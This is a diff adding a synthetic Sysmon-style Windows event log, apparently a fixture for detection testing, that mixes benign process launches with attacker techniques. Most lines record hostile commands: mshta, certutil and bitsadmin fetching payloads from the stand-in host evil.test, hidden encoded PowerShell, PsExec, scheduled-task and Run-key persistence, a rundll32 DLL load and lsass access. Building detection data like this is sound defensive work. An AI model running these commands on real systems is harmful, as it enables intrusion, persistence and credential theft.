@@ -1,0 +1,19 @@
+2026-11-20 09:00:01 EventID=1 Image=C:\Windows\System32\notepad.exe CommandLine=notepad.exe notes.txt
+2026-11-20 09:01:10 EventID=1 Image=C:\Windows\System32\mshta.exe CommandLine=mshta.exe http://evil.test/payload.hta
+2026-11-20 09:02:14 EventID=1 Image=C:\Windows\System32\mshta.exe CommandLine=mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd""")
+2026-11-20 09:03:20 EventID=1 Image=C:\Windows\System32\wscript.exe CommandLine=wscript.exe C:\Users\Public\invoice.vbs
+2026-11-20 09:04:05 EventID=1 Image=C:\Windows\System32\cscript.exe CommandLine=cscript.exe //E:vbscript C:\Temp\run.vbs
+2026-11-20 09:05:30 EventID=1 Image=C:\Windows\System32\whoami.exe CommandLine=whoami /all
+2026-11-20 09:06:12 EventID=1 Image=C:\Windows\System32\net.exe CommandLine=net group "Domain Admins" /domain
+2026-11-20 09:07:45 EventID=1 Image=C:\Windows\System32\certutil.exe CommandLine=certutil.exe -urlcache -split -f http://evil.test/p.exe C:\Temp\p.exe
+2026-11-20 09:08:02 EventID=1 Image=C:\Windows\System32\certutil.exe CommandLine=certutil.exe -decode C:\Temp\p.b64 C:\Temp\p.exe
+2026-11-20 09:09:33 EventID=1 Image=C:\Windows\System32\bitsadmin.exe CommandLine=bitsadmin /transfer job /download /priority high http://evil.test/p.exe C:\Temp\p.exe
+2026-11-20 09:10:41 EventID=1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine=powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A
+2026-11-20 09:11:50 EventID=1 Image=C:\Windows\PSEXESVC.exe CommandLine=C:\Windows\PSEXESVC.exe ParentImage=C:\Windows\System32\services.exe
+2026-11-20 09:12:07 EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\PSEXESVC.exe
+2026-11-20 09:13:19 EventID=1 Image=C:\Windows\System32\schtasks.exe CommandLine=schtasks.exe /create /tn Updater /tr C:\Temp\a.exe /sc onlogon
+2026-11-20 09:14:26 EventID=1 Image=C:\Windows\System32\rundll32.exe CommandLine=rundll32.exe C:\Users\Public\evil.dll,Start
+2026-11-20 09:15:38 EventID=13 Image=C:\Windows\System32\reg.exe TargetObject=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater Details=C:\Temp\a.exe
+2026-11-20 09:15:39 EventID=1 Image=C:\Windows\System32\reg.exe CommandLine=reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Temp\a.exe
+2026-11-20 09:16:52 EventID=10 SourceImage=C:\Temp\x.exe TargetImage=C:\Windows\System32\lsass.exe GrantedAccess=0x1010
+2026-11-20 09:17:05 EventID=1 Image=C:\Program Files\Google\Chrome\Application\chrome.exe CommandLine=chrome.exe --new-window example.com
